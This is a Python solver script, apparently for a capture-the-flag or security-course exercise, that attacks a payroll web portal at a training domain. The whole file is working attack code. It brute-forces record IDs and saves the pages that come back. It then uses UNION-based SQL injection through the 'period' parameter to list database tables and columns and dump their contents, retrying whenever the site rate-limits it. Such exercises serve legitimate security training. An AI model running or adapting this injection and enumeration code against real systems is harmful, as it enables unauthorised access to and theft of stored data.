import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

from bs4 import BeautifulSoup

BASE_URL = "https://payportal.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def _brute_force_id(self):
        i = 1
        while True:
            url = f"{BASE_URL}/?id={str(i)}"
            print(f"🔗 {url = }")
            response = self.session.get(url)
            if response.status_code == 429:
                continue

            find_flag(response.text)

            soup = BeautifulSoup(response.text, "html.parser")
            if soup.find_all("td"):
                with open(f"response_{i}.html", "w") as file:
                    file.write(url + '\n')
                    file.write(response.text)

            i += 1

    def _get_table_names(self) -> list[str]:
        payload = '" UNION SELECT 1, 2, 3, 4, 5, 6, 7, table_name FROM information_schema.tables;'
        response = self.session.get(BASE_URL, params={"period": payload})
        soup = BeautifulSoup(response.text, "html.parser")
        return [td.get_text() for td in soup.find_all("td", {"name": "net"}) if not td.get_text().startswith('$')]

    def _get_column_names(self, table_name):
        payload = f'" UNION SELECT 1, 2, 3, 4, 5, 6, 7, column_name FROM information_schema.columns WHERE table_name = "{table_name}";'
        response = self.session.get(BASE_URL, params={"period": payload})
        soup = BeautifulSoup(response.text, "html.parser")
        return [td.get_text() for td in soup.find_all("td", {"name": "net"}) if not td.get_text().startswith('$')]

    def run(self):
        table_names = self._get_table_names()
        for table_name in table_names:
            column_names = self._get_column_names(table_name)
            for column_name in column_names:
                while True:
                    payload = f'" UNION SELECT 1, 2, 3, 4, 5, 6, 7, {column_name} FROM {table_name};'
                    response = self.session.get(BASE_URL, params={"period": payload})
                    if response.status_code != 429:
                        find_flag(response.text)
                        break

if __name__ == "__main__":
    Solver().run()